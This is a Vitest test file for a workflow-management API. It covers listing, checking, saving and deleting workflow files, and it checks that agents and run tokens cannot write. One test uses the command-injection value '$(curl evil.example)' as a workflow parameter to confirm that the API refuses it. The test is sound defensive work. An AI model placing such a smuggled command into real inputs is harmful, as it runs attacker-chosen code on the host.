// The Workflows routes: the app lists each store's workflows with their text and stages, offers
// the starter templates, checks edited text with a compiled preview, and a person saves or
// deletes a workflow file. A run token, or an `as` that is not a person, writes nothing.
import { createHash } from 'node:crypto';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { BLANK_WORKFLOW, initRoot, templateWorkflowText } from '@swarmup/core';
import type { RunRecord, WorkflowCheck, WorkflowListItem, WorkflowTemplate } from '../src/index.js';
import { startApi, Supervisor } from '../src/index.js';

const dirs: string[] = [];
const sups: Supervisor[] = [];
const closers: (() => Promise<void>)[] = [];

afterEach(async () => {
  const shut = closers.splice(0);
  const mine = sups.splice(0);
  const gone = dirs.splice(0);
  try {
    for (const c of shut) await c();
    for (const s of mine) {
      liveMap(s).clear();
      await s.close();
    }
  } finally {
    for (const d of gone) rmSync(d, { recursive: true, force: true, maxRetries: 5 });
  }
}, 90_000);

function temp(): string {
  const d = mkdtempSync(join(tmpdir(), 'swarmupd-workflows-'));
  dirs.push(d);
  return d;
}

function liveMap(sup: Supervisor): Map<string, { record: RunRecord }> {
  return (sup as unknown as { live: Map<string, { record: RunRecord }> }).live;
}

function registerRun(sup: Supervisor, token: string, id: string): void {
  const record: RunRecord = {
    id,
    agent: 'fake:engineer',
    project: 'test',
    pid: 1,
    image: 'fake',
    command: 'fake',
    cwd: sup.context.cwd,
    log: sup.store.logPath(id),
    started_at: new Date().toISOString(),
    status: 'running',
    budget_minutes: 60,
    tokens: 0,
    token_sha256: createHash('sha256').update(token).digest('hex'),
  };
  sup.store.save(record);
  liveMap(sup).set(record.id, { record });
}

async function setup() {
  const repo = temp();
  execFileSync('git', ['init', '-q'], { cwd: repo, windowsHide: true });
  initRoot(repo, { name: 'test', human: 'human:dawid', workflows: ['bugfix'] });
  const userConfig = join(temp(), 'config.yml');
  writeFileSync(userConfig, 'me: human:dawid\nmachine: desk\nopsd:\n  sync: false\n');
  const env = {
    ...process.env,
    SWARMUP_CONFIG: userConfig,
    SWARMUP_STATE_DIR: temp(),
  } as NodeJS.ProcessEnv;
  for (const k of ['AGENT', 'ROOTS', 'RUN', 'RUN_TOKEN', 'RUN_STATE_DIR']) {
    delete env[`SWARMUP_${k}`];
    delete env[`OPS_${k}`];
  }
  const sup = new Supervisor({
    env,
    cwd: repo,
    user: { me: 'human:dawid', machine: 'desk' },
    freeMem: () => 64 * 2 ** 30,
  });
  sups.push(sup);
  const api = await startApi(sup, { port: 0, token: 'full-token', version: 't', build: '1' });
  closers.push(api.close);
  const call = async (token: string, method: 'GET' | 'POST', path: string, body?: unknown) => {
    const res = await fetch(`http://127.0.0.1:${api.port}${path}`, {
      method,
      headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    const text = await res.text();
    return { status: res.status, data: JSON.parse(text) as Record<string, unknown> };
  };
  const store = join(repo, '.swarmup');
  return { sup, store, call };
}

describe('Workflows API', () => {
  it('lists workflows with their text and stages, and the starter templates', async () => {
    const { call } = await setup();
    const list = (await call('full-token', 'GET', '/api/workflows'))
      .data as unknown as WorkflowListItem[];
    expect(list).toHaveLength(1);
    const w = list[0]!;
    expect(w).toMatchObject({ root: 'test', id: 'bugfix', ok: true, approval: 'starter' });
    expect(w.text).toBe(templateWorkflowText('bugfix'));
    expect(w.def?.stages.map((s) => s.key)).toEqual(['reproduce', 'fix', 'verify']);
    const templates = (await call('full-token', 'GET', '/api/workflows/templates'))
      .data as unknown as WorkflowTemplate[];
    expect(templates.map((t) => t.id)).toEqual([
      'bugfix',
      'campaign-launch',
      'content-piece',
      'feature',
      'blank',
    ]);
    expect(templates.at(-1)!.text).toBe(BLANK_WORKFLOW);
  });

  it('checks edited text with line numbers and compiles a preview for sample values', async () => {
    const { call } = await setup();
    const good = (
      await call('full-token', 'POST', '/api/workflows/check', {
        id: 'bugfix',
        root: 'test',
        text: templateWorkflowText('bugfix'),
        params: { bug: 'crash on save' },
      })
    ).data as unknown as WorkflowCheck;
    expect(good.ok).toBe(true);
    expect(good.params).toEqual({ bug: 'crash on save', severity: 'p2' });
    expect(good.plan?.milestone.title).toBe('Fix: crash on save');
    expect(good.plan?.items.map((i) => i.key)).toEqual(['reproduce', 'fix', 'verify']);
    const bad = (
      await call('full-token', 'POST', '/api/workflows/check', {
        id: 'x',
        text: 'milestone:\n  title: T\n  done_when: D\nstages:\n  - key: a\n    estimate: soon\n',
      })
    ).data as unknown as WorkflowCheck;
    expect(bad.ok).toBe(false);
    expect(bad.problems.find((p) => p.path.includes('estimate'))).toMatchObject({ line: 6 });
    const broken = await call('full-token', 'POST', '/api/workflows/check', {
      id: 'Bad Id',
      text: '',
    });
    expect(broken.status).toBe(400);
  });

  it('names the parameters that go into a command, and refuses a hostile value at start', async () => {
    const { call, store } = await setup();
    writeFileSync(
      join(store, 'workflows', 'check.yaml'),
      [
        'params:',
        '  target: {required: true}',
        '  note: {default: hi}',
        'milestone:',
        "  title: 'Check {{target}} ({{note}})'",
        "  done_when: '{{target}} passes'",
        'stages:',
        '  - key: test',
        "    title: 'Test {{target}}'",
        "    owner: '*:engineer'",
        '    estimate: 1h',
        "    done_when: {kind: command, run: 'npm test -- {{target}}'}",
        '',
      ].join('\n'),
    );
    const list = (await call('full-token', 'GET', '/api/workflows'))
      .data as unknown as WorkflowListItem[];
    expect(list.find((w) => w.id === 'check')?.command_params).toEqual(['target']);
    expect(list.find((w) => w.id === 'bugfix')?.command_params).toEqual([]);
    const start = await call('full-token', 'POST', '/api/workflows/start', {
      as: 'human:dawid',
      root: 'test',
      id: 'check',
      params: { target: '$(curl evil.example)' },
    });
    expect(start.status).toBe(400);
    expect(String(start.data.error)).toContain('--param target goes into a command criterion');
    // The preview checks what the person typed, but not the sample values standing in.
    const check = async (params: Record<string, string>) =>
      (
        await call('full-token', 'POST', '/api/workflows/check', {
          id: 'check',
          root: 'test',
          text: readFileSync(join(store, 'workflows', 'check.yaml'), 'utf8'),
          params,
        })
      ).data as unknown as WorkflowCheck;
    expect((await check({})).preview_error).toBeUndefined();
    expect((await check({ target: 'a b' })).preview_error).toContain(
      '--param target goes into a command criterion',
    );
  });

  it('lets a person create, edit and delete a workflow file', async () => {
    const { call, store } = await setup();
    const file = join(store, 'workflows', 'release.yaml');
    const created = await call('full-token', 'POST', '/api/workflows/save', {
      as: 'human:dawid',
      root: 'test',
      id: 'release',
      text: BLANK_WORKFLOW,
      create: true,
    });
    expect(created.status).toBe(201);
    expect(readFileSync(file, 'utf8')).toBe(BLANK_WORKFLOW);
    // Creating it again is refused: it exists.
    const again = await call('full-token', 'POST', '/api/workflows/save', {
      as: 'human:dawid',
      id: 'release',
      text: BLANK_WORKFLOW,
      create: true,
    });
    expect(again.status).toBe(409);
    // Text that does not check is refused, and the file stays.
    const invalid = await call('full-token', 'POST', '/api/workflows/save', {
      as: 'human:dawid',
      id: 'release',
      text: 'stages: []\n',
      expect: BLANK_WORKFLOW,
    });
    expect(invalid.status).toBe(409);
    expect(String(invalid.data.error)).toContain('would not check');
    const edited = BLANK_WORKFLOW.replace('title: New workflow', 'title: Release');
    const saved = await call('full-token', 'POST', '/api/workflows/save', {
      as: 'human:dawid',
      id: 'release',
      text: edited,
      expect: BLANK_WORKFLOW,
    });
    expect(saved.status).toBe(200);
    expect(readFileSync(file, 'utf8')).toBe(edited);
    // An editor that started from older text cannot overwrite the newer file.
    const stale = await call('full-token', 'POST', '/api/workflows/save', {
      as: 'human:dawid',
      id: 'release',
      text: BLANK_WORKFLOW,
      expect: BLANK_WORKFLOW,
    });
    expect(stale.status).toBe(409);
    expect(String(stale.data.error)).toContain('changed since you opened it');
    const deleted = await call('full-token', 'POST', '/api/workflows/delete', {
      as: 'human:dawid',
      id: 'release',
      expect: edited,
    });
    expect(deleted.status).toBe(200);
    expect(existsSync(file)).toBe(false);
  });

  it('refuses every write from a run token or an agent, and changes nothing', async () => {
    const { sup, call, store } = await setup();
    registerRun(sup, 'run-token', 'RUN-ONE');
    const file = join(store, 'workflows', 'bugfix.yaml');
    const before = readFileSync(file, 'utf8');
    const writes: Array<[string, Record<string, unknown>]> = [
      ['save', { id: 'bugfix', text: BLANK_WORKFLOW, expect: before }],
      ['save', { id: 'fresh', text: BLANK_WORKFLOW, create: true }],
      ['delete', { id: 'bugfix' }],
    ];
    for (const [route, body] of writes) {
      const run = await call('run-token', 'POST', `/api/workflows/${route}`, {
        as: 'human:dawid',
        ...body,
      });
      expect(run.status, route).toBe(403);
      expect(String(run.data.error)).toContain('run RUN-ONE cannot do it');
      const agent = await call('full-token', 'POST', `/api/workflows/${route}`, {
        as: 'claude:engineer',
        ...body,
      });
      expect(agent.status, route).toBe(403);
      expect(String(agent.data.error)).toContain('only a person');
    }
    expect(readFileSync(file, 'utf8')).toBe(before);
    expect(existsSync(join(store, 'workflows', 'fresh.yaml'))).toBe(false);
    // Reads and the check stay open to runs.
    expect((await call('run-token', 'GET', '/api/workflows')).status).toBe(200);
    const check = await call('run-token', 'POST', '/api/workflows/check', {
      id: 'bugfix',
      text: before,
    });
    expect(check.status).toBe(200);
  });
});
